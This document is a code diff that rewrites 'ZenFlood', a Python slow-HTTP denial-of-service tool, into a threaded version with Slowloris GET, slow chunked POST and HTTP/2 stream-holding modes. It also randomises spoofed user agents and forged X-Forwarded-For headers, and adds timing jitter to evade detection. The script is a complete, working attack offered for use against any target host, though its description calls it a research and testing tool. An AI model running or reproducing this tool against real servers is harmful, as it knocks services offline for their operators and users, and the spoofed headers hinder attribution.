@@ -11,115 +11,168 @@ $$$$$$$$/   ______   _______  $$$$$$$$/ $$ |  ______    ______    ____$$ |
 /$$      |$$       |$$ |  $$ |$$ |      $$ |$$    $$/ $$    $$/ $$    $$ |
 $$$$$$$$/  $$$$$$$/ $$/   $$/ $$/       $$/  $$$$$$/   $$$$$$/   $$$$$$$/
 
-Written by ZenRat-47. https://github.com/ZenRAT-47. Special Occasions.
-
+ZenFlood - Multi-Protocol, Adversarial SlowHTTP Testing Tool
+By SnailSploit/ Kai Aizen.
 """
 
+import argparse, logging, random, socket, sys, time, ssl, threading
+from collections import deque
 
-import argparse
-import logging
-import random
-import socket
-import sys
-import time
-import ssl
+DEFAULT_UAS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0",
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+]
 
-def parse_arguments():
-    parser = argparse.ArgumentParser(description="ZenFlood, low bandwidth stress test tool for websites")
-    parser.add_argument("host", nargs="?", help="Host to perform stress test on")
-    parser.add_argument("-p", "--port", default=80, type=int, help="Port of webserver, usually 80")
-    parser.add_argument("-s", "--sockets", default=150, type=int, help="Number of sockets to use in the test")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Increases logging")
-    parser.add_argument("-ua", "--randuseragents", action="store_true", help="Randomizes user-agents with each request")
-    parser.add_argument("-x", "--useproxy", action="store_true", help="Use a SOCKS5 proxy for connecting")
-    parser.add_argument("--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host")
-    parser.add_argument("--proxy-port", default=8080, type=int, help="SOCKS5 proxy port")
-    parser.add_argument("--https", action="store_true", help="Use HTTPS for the requests")
-    parser.add_argument("--sleeptime", default=15, type=int, help="Time to sleep between each header sent")
+def build_headers(host, rand=True, fake_count=2):
+    base = [
+        ("Host", host),
+        ("User-Agent", random.choice(DEFAULT_UAS)),
+        ("Accept-Language", "en-US,en;q=0.5"),
+        ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
+        ("Cache-Control", "no-cache"),
+    ]
+    fake_headers = [
+        ("X-Request-ID", str(random.randint(100000, 999999))),
+        ("X-Forwarded-For", ".".join(str(random.randint(1, 255)) for _ in range(4))),
+    ] + [("X-Fake-" + str(i), f"Value{random.randint(1000, 9999)}") for i in range(fake_count)]
+    headers = base + fake_headers if rand else base
+    random.shuffle(headers)
+    return headers
 
-    args = parser.parse_args()
-    if not args.host:
-        parser.print_help()
-        sys.exit(1)
-
-    return args
-
-def configure_logging(verbose):
-    level = logging.DEBUG if verbose else logging.INFO
-    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=level)
-
-def init_socket(ip, port, https, proxy_settings):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(4)
-
-    if https:
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        s = ctx.wrap_socket(s, server_hostname=ip)
-
-    if proxy_settings['use']:
-        from socks import setdefaultproxy, socksocket, PROXY_TYPE_SOCKS5  # Lazy import
-        setdefaultproxy(PROXY_TYPE_SOCKS5, proxy_settings['host'], proxy_settings['port'])
-        s = socksocket()
-        s.connect((ip, port))
-    else:
-        s.connect((ip, port))
-
-    return s
-
-def send_line(sock, line):
-    sock.send((line + "\r\n").encode("utf-8"))
-
-def send_header(sock, name, value):
-    send_line(sock, f"{name}: {value}")
-
-def init_socket_list(host, port, https, user_agents, randuseragent, num_sockets, proxy_settings):
-    list_of_sockets = []
-    for _ in range(num_sockets):
-        try:
-            s = init_socket(host, port, https, proxy_settings)
-            ua = random.choice(user_agents) if randuseragent else user_agents[0]
-            send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1")
-            send_header(s, "User-Agent", ua)
-            send_header(s, "Accept-language", "en-US,en,q=0.5")
-            list_of_sockets.append(s)
-        except socket.error as e:
-            logging.debug(f"Failed to create new socket: {e}")
-    return list_of_sockets
-
-def zenflood_attack(host, port, sockets, sleeptime, https, randuseragent, proxy_settings):
-    user_agents = [...]  # Your list of user agents here
-
-    logging.info("Attacking %s with %s sockets.", host, sockets)
-    socket_list = init_socket_list(host, port, https, user_agents, randuseragent, sockets, proxy_settings)
-
-    while True:
-        logging.info("Sending keep-alive headers. Socket count: %s", len(socket_list))
-        for s in socket_list[:]:
-            try:
-                send_header(s, "X-a", str(random.randint(1, 5000)))
-            except socket.error:
-                socket_list.remove(s)
-
-        if len(socket_list) < sockets:
-            socket_list += init_socket_list(host, port, https, user_agents, randuseragent, sockets - len(socket_list), proxy_settings)
-
-        logging.debug("Sleeping for %d seconds", sleeptime)
-        time.sleep(sleeptime)
-
-def main():
-    args = parse_arguments()
-    configure_logging(args.verbose)
-
-    proxy_settings = {'use': args.useproxy, 'host': args.proxy_host, 'port': args.proxy_port} if args.useproxy else {'use': False}
-
+def slowloris_http1(host, port, ssl_on, attack_mode, header_jitter, payload_jitter, log_queue, stop_event):
     try:
-        zenflood_attack(args.host, args.port, args.sockets, args.sleeptime, args.https, args.randuseragents, proxy_settings)
-    except KeyboardInterrupt:
-        logging.info("Stopping ZenFlood attack.")
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(4)
+        s.connect((host, port))
+        if ssl_on:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            s = ctx.wrap_socket(s, server_hostname=host)
+
+        if attack_mode == "get":
+            s.send(f"GET /?{random.randint(0,999999)} HTTP/1.1\r\n".encode())
+        else:
+            s.send(b"POST / HTTP/1.1\r\n")
+            s.send(b"Transfer-Encoding: chunked\r\n")
+
+        headers = build_headers(host, rand=True, fake_count=3)
+        for k, v in headers:
+            s.send(f"{k}: {v}\r\n".encode())
+            time.sleep(random.uniform(*header_jitter))
+
+        s.send(b"\r\n")
+
+        while not stop_event.is_set():
+            if attack_mode == "get":
+                s.send(f"X-Keep-Alive: {random.randint(1, 999999)}\r\n".encode())
+            else:
+                chunk = "%x\r\n%s\r\n" % (random.randint(10, 32), "A"*random.randint(10,32))
+                s.send(chunk.encode())
+            try:
+                s.settimeout(0.5)
+                resp = s.recv(2048)
+                if resp:
+                    log_queue.append(resp[:100])
+            except socket.timeout:
+                pass
+            except Exception as e:
+                log_queue.append(f"[CLOSED]: {e}".encode())
+                break
+            time.sleep(random.uniform(*payload_jitter))
+        s.close()
     except Exception as e:
-        logging.error(f"Error in ZenFlood attack: {e}")
+        log_queue.append(f"[INIT FAIL]: {e}".encode())
+
+def slowloris_http2(host, port, ssl_on, header_jitter, payload_jitter, log_queue, stop_event):
+    try:
+        from h2.connection import H2Connection
+        from h2.events import ResponseReceived, DataReceived
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(4)
+        s.connect((host, port))
+        if ssl_on:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            s = ctx.wrap_socket(s, server_hostname=host)
+
+        conn = H2Connection()
+        conn.initiate_connection()
+        s.sendall(conn.data_to_send())
+
+        stream_id = conn.get_next_available_stream_id()
+        headers = [
+            (':method', 'GET'),
+            (':authority', host),
+            (':scheme', 'https' if ssl_on else 'http'),
+            (':path', '/'),
+        ] + [(k, v) for k, v in build_headers(host, rand=True, fake_count=4)]
+        conn.send_headers(stream_id, headers, end_stream=False)
+        s.sendall(conn.data_to_send())
+
+        while not stop_event.is_set():
+            conn.increment_flow_control_window(1024, stream_id=stream_id)
+            s.sendall(conn.data_to_send())
+            try:
+                s.settimeout(0.5)
+                resp = s.recv(4096)
+                if resp:
+                    log_queue.append(resp[:100])
+            except socket.timeout:
+                pass
+            except Exception as e:
+                log_queue.append(f"[H2 CLOSED]: {e}".encode())
+                break
+            time.sleep(random.uniform(*payload_jitter))
+        s.close()
+    except Exception as e:
+        log_queue.append(f"[H2 INIT FAIL]: {e}".encode())
+
+def launch_attack(args):
+    log_queue = deque(maxlen=200)
+    stop_event = threading.Event()
+    threads = []
+    for _ in range(args.sockets):
+        if args.http2:
+            t = threading.Thread(target=slowloris_http2,
+                args=(args.host, args.port, args.https, (args.header_jitter_min, args.header_jitter_max),
+                    (args.payload_jitter_min, args.payload_jitter_max), log_queue, stop_event))
+        else:
+            t = threading.Thread(target=slowloris_http1,
+                args=(args.host, args.port, args.https, args.mode, (args.header_jitter_min, args.header_jitter_max),
+                    (args.payload_jitter_min, args.payload_jitter_max), log_queue, stop_event))
+        t.daemon = True
+        t.start()
+        threads.append(t)
+    try:
+        while True:
+            time.sleep(3)
+            print(f"[+] Active sockets: {len(threads)} | Recent log: {list(log_queue)[-1:]}")
+    except KeyboardInterrupt:
+        print("\n[!] Interrupt detected, shutting down...")
+        stop_event.set()
+        for t in threads: t.join(2)
+        print("[!] Attack ended.")
+
+def parse_args():
+    p = argparse.ArgumentParser(description="ZenFlood: HTTP/1.1 & HTTP/2 SlowHTTP Research Tool")
+    p.add_argument("host", help="Target host (IP or domain)")
+    p.add_argument("-p", "--port", default=443, type=int, help="Target port (default: 443 for HTTPS)")
+    p.add_argument("-s", "--sockets", default=100, type=int, help="Number of sockets/streams")
+    p.add_argument("--https", action="store_true", help="Use SSL/TLS (default port 443)")
+    p.add_argument("--http2", action="store_true", help="Enable HTTP/2 mode (default: HTTP/1.1)")
+    p.add_argument("--mode", choices=["get", "post"], default="get", help="Attack mode: get (Slowloris) or post (Slow POST/Chunked)")
+    p.add_argument("--header-jitter-min", type=float, default=1.0, help="Header send jitter min (seconds)")
+    p.add_argument("--header-jitter-max", type=float, default=3.0, help="Header send jitter max (seconds)")
+    p.add_argument("--payload-jitter-min", type=float, default=8.0, help="Payload/keepalive jitter min (seconds)")
+    p.add_argument("--payload-jitter-max", type=float, default=15.0, help="Payload/keepalive jitter max (seconds)")
+    return p.parse_args()
 
 if __name__ == "__main__":
-    main()
+    args = parse_args()
+    launch_attack(args)
